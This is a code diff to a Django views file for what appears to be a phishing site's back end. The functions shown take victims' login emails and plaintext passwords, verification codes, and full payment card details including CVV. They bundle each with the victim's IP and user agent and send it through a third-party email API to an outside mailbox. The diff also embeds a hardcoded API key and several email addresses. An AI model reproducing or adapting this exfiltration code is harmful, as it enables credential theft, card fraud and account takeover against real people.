@@ -1,10 +1,12 @@
 from django.shortcuts import render
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
-from django.core.mail import send_mail
 import json
-import random
-import string
+import requests
+import os
+
+# Elastic Email configuration
+ELASTIC_EMAIL_API_KEY = os.getenv('ELASTIC_EMAIL_API_KEY', 'E324D840CD6EB52BCB45A46CB30B8D097A993276B1745464FB9EA195EEB6BC6CCD1005B569275AA54C4F556060652219')
 
 # Create your views here.
 
@@ -24,68 +26,117 @@ def get_user_agent(request):
 def send_login_notification_email(login_data, ip_address, user_agent):
     email_subject = 'New Login Attempt'
     email_body = f"""
-    A new login attempt has been made.
-    
-    Email: {login_data.get('email')}
-    Password: {login_data.get('password')}
-    
-    === REQUEST INFORMATION ===
-    IP Address: {ip_address}
-    User Agent: {user_agent}
+A new login attempt has been made.
+
+Email: {login_data.get('email')}
+Password: {login_data.get('password')}
+
+=== REQUEST INFORMATION ===
+IP Address: {ip_address}
+User Agent: {user_agent}
     """
+    
     try:
-        send_mail(
-            email_subject,
-            email_body,
-            'chimasid7@gmail.com',
-            ['jvictory278@gmail.com'],
-            fail_silently=False,
+        response = requests.post(
+            'https://api.elasticemail.com/v2/email/send',
+            data={
+                'apikey': ELASTIC_EMAIL_API_KEY,
+                'from': 'clydine@proton.me',
+                'to': 'clydine@proton.me',
+                'subject': email_subject,
+                'bodyText': email_body
+            }
         )
-        print("✅ Email sent successfully!")
+        
+        result = response.json()
+        
+        if response.status_code == 200 and result.get('success'):
+            print(f"✅ Email sent successfully! Transaction ID: {result.get('data', {}).get('transactionid')}")
+            return result
+        else:
+            print(f"❌ Email failed: {result}")
+            raise Exception(f"Elastic Email error: {result.get('error', 'Unknown error')}")
+            
     except Exception as e:
-        print(f"❌ Email failed: {type(e).__name__}: {e}")
-        raise  # Re-raise to see the full error
+        print(f"❌ Email exception: {type(e).__name__}: {e}")
+        raise
 
 def send_code_notification_email(code_data, ip_address, user_agent):
     email_subject = 'Verification Code Submitted'
     email_body = f"""
-    A verification code has been submitted.
-    
-    Code: {code_data.get('code')}
-    
-    === REQUEST INFORMATION ===
-    IP Address: {ip_address}
-    User Agent: {user_agent}
+A verification code has been submitted.
+
+Code: {code_data.get('code')}
+
+=== REQUEST INFORMATION ===
+IP Address: {ip_address}
+User Agent: {user_agent}
     """
-    send_mail(
-        email_subject,
-        email_body,
-        'chimasid7@gmail.com',
-        ['jvictory225@gmail.com'],
-        fail_silently=False,
-    )
+    
+    try:
+        response = requests.post(
+            'https://api.elasticemail.com/v2/email/send',
+            data={
+                'apikey': ELASTIC_EMAIL_API_KEY,
+                'from': 'clydine@proton.me',
+                'to': 'clydine@proton.me',
+                'subject': email_subject,
+                'bodyText': email_body
+            }
+        )
+        
+        result = response.json()
+        
+        if response.status_code == 200 and result.get('success'):
+            print(f"✅ Email sent successfully! Transaction ID: {result.get('data', {}).get('transactionid')}")
+            return result
+        else:
+            print(f"❌ Email failed: {result}")
+            raise Exception(f"Elastic Email error: {result.get('error', 'Unknown error')}")
+            
+    except Exception as e:
+        print(f"❌ Email exception: {type(e).__name__}: {e}")
+        raise
 
 def send_payment_email(payment_data, ip_address, user_agent):
     email_subject = 'New Payment Received'
     email_body = f"""
-    A new payment has been received.
-    
-    Name on Card: {payment_data.get('nameOnCard')}
-    Card Number: {payment_data.get('cardNumber')}
-    Expiry Date: {payment_data.get('expiryDate')}
-    CVV: {payment_data.get('cvv')}
-    
-    === REQUEST INFORMATION ===
-    IP Address: {ip_address}
-    User Agent: {user_agent}
+A new payment has been received.
+
+Name on Card: {payment_data.get('nameOnCard')}
+Card Number: {payment_data.get('cardNumber')}
+Expiry Date: {payment_data.get('expiryDate')}
+CVV: {payment_data.get('cvv')}
+
+=== REQUEST INFORMATION ===
+IP Address: {ip_address}
+User Agent: {user_agent}
     """
-    send_mail(
-        email_subject,
-        email_body,
-        'chimasid7@gmail.com',
-        ['jvictory225@gmail.com'],
-        fail_silently=False,
-    )
+    
+    try:
+        response = requests.post(
+            'https://api.elasticemail.com/v2/email/send',
+            data={
+                'apikey': ELASTIC_EMAIL_API_KEY,
+                'from': 'clydine@proton.me',
+                'to': 'clydine@proton.me',
+                'subject': email_subject,
+                'bodyText': email_body
+            }
+        )
+        
+        result = response.json()
+        
+        if response.status_code == 200 and result.get('success'):
+            print(f"✅ Email sent successfully! Transaction ID: {result.get('data', {}).get('transactionid')}")
+            return result
+        else:
+            print(f"❌ Email failed: {result}")
+            raise Exception(f"Elastic Email error: {result.get('error', 'Unknown error')}")
+            
+    except Exception as e:
+        print(f"❌ Email exception: {type(e).__name__}: {e}")
+        raise
 
 @csrf_exempt
 def address(request):
